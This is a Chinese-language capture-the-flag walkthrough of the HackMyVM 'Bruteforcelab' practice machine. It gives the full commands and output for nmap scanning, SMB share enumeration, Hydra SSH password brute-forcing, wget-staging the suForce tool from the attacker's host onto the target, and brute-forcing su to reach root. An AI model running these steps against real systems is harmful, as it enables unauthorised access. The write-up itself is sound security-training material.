# 简介

![image-20250322203846278](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250322203846321.png)

靶机：[Bruteforcelab](https://hackmyvm.eu/machines/machine.php?vm=Bruteforcelab)
 难度：绿色
 目标 IP：192.168.205.164
 本机 IP：192.168.205.128
 知识点："旨在用于练习暴力破解和 SMB 服务利用。"

# 一：信息收集

## 1.nmap扫描

开扫！

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n -p- -T4 192.168.205.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 20:39 CST
Nmap scan report for 192.168.205.164
Host is up (0.00033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
|_  256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
10000/tcp open  http        MiniServ 2.021 (Webmin httpd)
|_http-server-header: MiniServ/2.021
|_http-title: 200 &mdash; Document follows
19000/tcp open  netbios-ssn Samba smbd 4
19222/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:DB:B7:99 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.205.164

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.38 seconds
```

显示开放了22、10000、19000、19222端口，开启了ssh、http、smb服务

## 2.SMB服务探测

个人比较喜欢先看smb服务。使用smbclient进行探测

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.164 -p 19000 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.164 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available

```

发现存在Test共享目录，连接后发现存在README.txt

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.164/Test -p 19000
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Mon Mar 27 03:06:46 2023
  ..                                  D        0  Mon Mar 27 02:12:02 2023
  README.txt                          N      115  Mon Mar 27 03:06:46 2023

                9232860 blocks of size 1024. 3032372 blocks available

```

查看README.txt，发现其存在用户名

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat README.txt   
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly

```

*嘿 Andrea 听我说，我要休息一下。我想我已经正确地为 SMB 服务器设置了这个原型*

# 二：信息利用

使用hydra暴力破解ssh服务，建议使用xato-net-10-million-passwords-10000.txt字典，rockyou.txt字典可能会存在缺失的可能

```bash
┌──(kali㉿kali)-[~/test]
└─$ hydra -l andrea -P xato10000.txt ssh://192.168.205.164 -I -u -f -e nsr -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-22 20:55:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10003 login tries (l:1/p:10003), ~157 tries per task
[DATA] attacking ssh://192.168.205.164:22/
[STATUS] 635.00 tries/min, 635 tries in 00:01h, 9401 to do in 00:15h, 31 active
[22][ssh] host: 192.168.205.164   login: andrea   password: awesome
[STATUS] attack finished for 192.168.205.164 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-22 20:57:20

```

# 三：获取shell

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh andrea@192.168.205.164               
The authenticity of host '192.168.205.164 (192.168.205.164)' can't be established.
ED25519 key fingerprint is SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
    ~/.ssh/known_hosts:29: [hashed name]
    ~/.ssh/known_hosts:30: [hashed name]
    ~/.ssh/known_hosts:31: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.164' (ED25519) to the list of known hosts.
andrea@192.168.205.164's password: 
Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 21:26:42 2023 from 192.168.1.84
andrea@LAB-Bruteforce:~$ id
uid=1001(andrea) gid=1001(andrea) groups=1001(andrea)
andrea@LAB-Bruteforce:~$ whoami 
andrea
andrea@LAB-Bruteforce:~$ hostname -I
192.168.205.164 

```

# 四：提权-root

使用suFirce工具直接爆破root

## 1.准备

```bash
andrea@LAB-Bruteforce:~$ cd /tmp/
andrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/suForce
--2025-03-22 14:05:42--  http://192.168.205.128/suForce
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2430 (2.4K) [application/octet-stream]
Saving to: ‘suForce’

suForce                           100%[============================================================>]   2.37K  --.-KB/s    in 0s      

2025-03-22 14:05:42 (4.78 MB/s) - ‘suForce’ saved [2430/2430]

andrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/xato10000.txt
--2025-03-22 14:05:54--  http://192.168.205.128/xato10000.txt
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 76497 (75K) [text/plain]
Saving to: ‘xato10000.txt’

xato10000.txt                     100%[============================================================>]  74.70K  --.-KB/s    in 0s      

2025-03-22 14:05:54 (379 MB/s) - ‘xato10000.txt’ saved [76497/76497]

andrea@LAB-Bruteforce:/tmp$ chmod +x suForce 

```

## 2.撞击

```bash
andrea@LAB-Bruteforce:/tmp$ ./suForce -u root -w xato10000.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | root
📖 Wordlist | xato10000.txt
🔎 Status   | 3412/10000/34%/1998
💥 Password | 1998
───────────────────────────────────


andrea@LAB-Bruteforce:/tmp$ su -
Password: 
root@LAB-Bruteforce:~# id
uid=0(root) gid=0(root) groups=0(root)

```

